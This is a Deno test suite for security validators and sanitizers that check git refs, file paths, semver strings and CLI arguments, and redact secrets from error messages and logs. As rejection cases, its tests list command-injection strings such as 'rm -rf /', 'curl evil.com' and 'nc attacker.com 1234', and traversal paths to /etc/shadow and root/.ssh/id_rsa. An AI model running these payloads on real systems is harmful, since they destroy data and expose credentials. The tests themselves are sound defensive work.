/**
 * @fileoverview Security utilities test suite
 * @module security-utils_test
 */

import { assertEquals, assertRejects, assertThrows } from "jsr:@std/assert";
import {
  createSecurityLog,
  sanitizeCommitMessage,
  sanitizeErrorMessage,
  validateCliArgs,
  validateFilePath,
  validateGitRef,
  validateVersion,
} from "./security-utils.ts";

Deno.test("validateGitRef - valid tags", () => {
  // Valid tags
  assertEquals(validateGitRef("v1.2.3", "tag"), "v1.2.3");
  assertEquals(validateGitRef("release-1.0", "tag"), "release-1.0");
  assertEquals(validateGitRef("feature/new-feature", "tag"), "feature/new-feature");
  
  // Trimming
  assertEquals(validateGitRef("  v1.2.3  ", "tag"), "v1.2.3");
});

Deno.test("validateGitRef - invalid tags", () => {
  // Invalid characters
  assertThrows(() => validateGitRef("tag with spaces", "tag"), Error, "forbidden characters");
  assertThrows(() => validateGitRef("tag:colon", "tag"), Error, "forbidden characters");
  assertThrows(() => validateGitRef("tag[bracket]", "tag"), Error, "forbidden characters");
  
  // Invalid patterns
  assertThrows(() => validateGitRef("-startswithdash", "tag"), Error, "invalid pattern");
  assertThrows(() => validateGitRef("ends.lock", "tag"), Error, "invalid pattern");
  assertThrows(() => validateGitRef("has..dots", "tag"), Error, "invalid pattern");
  assertThrows(() => validateGitRef("ends.", "tag"), Error, "invalid pattern");
  
  // Empty
  assertThrows(() => validateGitRef("", "tag"), Error, "must be a non-empty string");
  assertThrows(() => validateGitRef("   ", "tag"), Error, "cannot be empty");
});

Deno.test("validateGitRef - valid commits", () => {
  assertEquals(validateGitRef("a1b2c3d", "commit"), "a1b2c3d");
  assertEquals(validateGitRef("1234567890abcdef", "commit"), "1234567890abcdef");
  assertEquals(
    validateGitRef("1234567890abcdef1234567890abcdef12345678", "commit"),
    "1234567890abcdef1234567890abcdef12345678"
  );
});

Deno.test("validateGitRef - invalid commits", () => {
  assertThrows(() => validateGitRef("abc", "commit"), Error, "7-40 character hex");
  assertThrows(() => validateGitRef("xyz1234", "commit"), Error, "7-40 character hex");
  assertThrows(() => validateGitRef("123456", "commit"), Error, "7-40 character hex");
});

Deno.test("validateFilePath - valid paths", () => {
  const basePath = "/home/project";
  
  // Relative paths
  assertEquals(validateFilePath("./src/file.ts", basePath), "/home/project/src/file.ts");
  assertEquals(validateFilePath("src/file.ts", basePath), "/home/project/src/file.ts");
  
  // Absolute paths within base
  assertEquals(validateFilePath("/home/project/src/file.ts", basePath), "/home/project/src/file.ts");
  
  // Temp paths (allowed)
  assertEquals(
    validateFilePath("/tmp/test.txt", basePath),
    "/tmp/test.txt"
  );
  assertEquals(
    validateFilePath("/var/folders/xyz/temp.txt", basePath),
    "/var/folders/xyz/temp.txt"
  );
});

Deno.test("validateFilePath - directory traversal", () => {
  const basePath = "/home/project";
  
  // Directory traversal attempts
  assertThrows(() => validateFilePath("../../../etc/passwd", basePath), Error, "directory traversal");
  assertThrows(() => validateFilePath("./src/../../../etc/passwd", basePath), Error, "directory traversal");
  assertThrows(() => validateFilePath("..\\..\\..\\windows\\system32", basePath), Error, "directory traversal");
});

Deno.test("validateFilePath - escaping base directory", () => {
  const basePath = "/home/project";
  
  // Paths outside base (not temp)
  assertThrows(() => validateFilePath("/etc/passwd", basePath), Error, "escapes base directory");
  assertThrows(() => validateFilePath("/home/other/file.txt", basePath), Error, "escapes base directory");
});

Deno.test("sanitizeCommitMessage", () => {
  // Normal messages
  assertEquals(
    sanitizeCommitMessage("feat: add new feature"),
    "feat: add new feature"
  );
  
  // Null bytes removed
  assertEquals(
    sanitizeCommitMessage("feat: add\0new feature"),
    "feat: addnew feature"
  );
  
  // Line ending normalization
  assertEquals(
    sanitizeCommitMessage("feat: add\r\nnew feature"),
    "feat: add\nnew feature"
  );
  assertEquals(
    sanitizeCommitMessage("feat: add\rnew feature"),
    "feat: add\nnew feature"
  );
  
  // Long messages truncated
  const longMessage = "x".repeat(15000);
  const result = sanitizeCommitMessage(longMessage);
  assertEquals(result.length, 10000 + "... (truncated)".length);
  assertEquals(result.endsWith("... (truncated)"), true);
  
  // Invalid input
  assertEquals(sanitizeCommitMessage(""), "");
  assertEquals(sanitizeCommitMessage(null as any), "");
  assertEquals(sanitizeCommitMessage(undefined as any), "");
});

Deno.test("validateVersion", () => {
  // Valid versions
  assertEquals(validateVersion("1.2.3"), "1.2.3");
  assertEquals(validateVersion("v1.2.3"), "v1.2.3");
  assertEquals(validateVersion("1.2.3-beta.1"), "1.2.3-beta.1");
  assertEquals(validateVersion("1.2.3-rc.1+build.123"), "1.2.3-rc.1+build.123");
  
  // Trimming
  assertEquals(validateVersion("  1.2.3  "), "1.2.3");
  
  // Invalid versions
  assertThrows(() => validateVersion("1.2"), Error, "valid semver");
  assertThrows(() => validateVersion("a.b.c"), Error, "valid semver");
  assertThrows(() => validateVersion("1.2.3.4"), Error, "valid semver");
  assertThrows(() => validateVersion(""), Error, "non-empty string");
});

Deno.test("sanitizeErrorMessage", () => {
  // Basic error
  const error = new Error("Something went wrong at /home/user/project/src/file.ts");
  const sanitized = sanitizeErrorMessage(error, false);
  assertEquals(sanitized.includes("/home/user/project"), false);
  assertEquals(sanitized.includes("/***/***/***/***"), true);
  
  // With stack trace
  const errorWithStack = new Error("Failed");
  errorWithStack.stack = "Error: Failed\n    at /home/user/project/src/file.ts:10:5";
  const sanitizedWithStack = sanitizeErrorMessage(errorWithStack, true);
  assertEquals(sanitizedWithStack.includes("Stack trace:"), true);
  assertEquals(sanitizedWithStack.includes("/home/user/project"), false);
  
  // IP addresses
  const ipError = new Error("Connection failed to 192.168.1.1:8080");
  const sanitizedIp = sanitizeErrorMessage(ipError, false);
  assertEquals(sanitizedIp.includes("192.168.1.1"), false);
  assertEquals(sanitizedIp.includes("***.***.***.***"), true);
  assertEquals(sanitizedIp.includes(":8080"), false);
  assertEquals(sanitizedIp.includes(":****"), true);
  
  // Secrets
  const secretError = new Error("Auth failed with token=abc123secret and password=mypass");
  const sanitizedSecret = sanitizeErrorMessage(secretError, false);
  assertEquals(sanitizedSecret.includes("abc123secret"), false);
  assertEquals(sanitizedSecret.includes("mypass"), false);
  assertEquals(sanitizedSecret.includes("token=***"), true);
  assertEquals(sanitizedSecret.includes("password=***"), true);
  
  // Non-Error objects
  assertEquals(sanitizeErrorMessage("string error", false), "An error occurred");
  assertEquals(sanitizeErrorMessage({ message: "object" }, false), "An error occurred");
  assertEquals(sanitizeErrorMessage(null, false), "An error occurred");
});

Deno.test("validateCliArgs", () => {
  // Valid args
  assertEquals(
    validateCliArgs(["--version", "1.2.3", "--tag", "v1.2.3"]),
    ["--version", "1.2.3", "--tag", "v1.2.3"]
  );
  
  // Shell metacharacters
  assertThrows(() => validateCliArgs(["rm -rf /", ";echo hacked"]), Error, "shell metacharacters");
  assertThrows(() => validateCliArgs(["test", "&&", "malicious"]), Error, "shell metacharacters");
  assertThrows(() => validateCliArgs(["$(whoami)"]), Error, "shell metacharacters");
  assertThrows(() => validateCliArgs(["`id`"]), Error, "shell metacharacters");
  assertThrows(() => validateCliArgs(["test|pipe"]), Error, "shell metacharacters");
  
  // Null bytes
  assertThrows(() => validateCliArgs(["test\0null"]), Error, "null byte");
  
  // Non-string arguments
  assertThrows(() => validateCliArgs([123 as any]), Error, "must be strings");
  assertThrows(() => validateCliArgs([{ cmd: "test" } as any]), Error, "must be strings");
});

Deno.test("createSecurityLog", () => {
  const log = createSecurityLog("user_login", {
    username: "john.doe",
    ip: "192.168.1.1",
    secret: "should-be-hidden",
    password: "also-hidden",
  });
  
  // Should contain action
  assertEquals(log.includes("[SECURITY]"), true);
  assertEquals(log.includes("Action: user_login"), true);
  
  // Should contain timestamp
  assertEquals(log.includes(new Date().getFullYear().toString()), true);
  
  // Should sanitize sensitive data
  assertEquals(log.includes("should-be-hidden"), false);
  assertEquals(log.includes("also-hidden"), false);
  assertEquals(log.includes('"secret": "***"'), true);
  assertEquals(log.includes('"password": "***"'), true);
  
  // Should preserve non-sensitive data
  assertEquals(log.includes("john.doe"), true);
  assertEquals(log.includes("192.168.1.1"), true);
});

// Test for command injection prevention
Deno.test("security - prevent command injection", () => {
  // These should all throw errors to prevent command injection
  const dangerousInputs = [
    "v1.0.0; rm -rf /",
    "v1.0.0 && curl evil.com",
    "v1.0.0 | nc attacker.com 1234",
    "v1.0.0:whoami",  // colon is forbidden
    "v1.0.0[id]",     // brackets are forbidden
    "v1.0.0\nrm -rf /",
  ];
  
  for (const input of dangerousInputs) {
    assertThrows(
      () => validateGitRef(input, "tag"),
      Error,
      undefined,
      `Should reject dangerous input: ${input}`
    );
  }
});

// Test for path traversal prevention
Deno.test("security - prevent path traversal", () => {
  const basePath = "/project";
  const traversalAttempts = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "./valid/../../../../../../etc/shadow",
    "subdir/../../../../../../../root/.ssh/id_rsa",
  ];
  
  for (const attempt of traversalAttempts) {
    assertThrows(
      () => validateFilePath(attempt, basePath),
      Error,
      undefined,
      `Should reject traversal attempt: ${attempt}`
    );
  }
});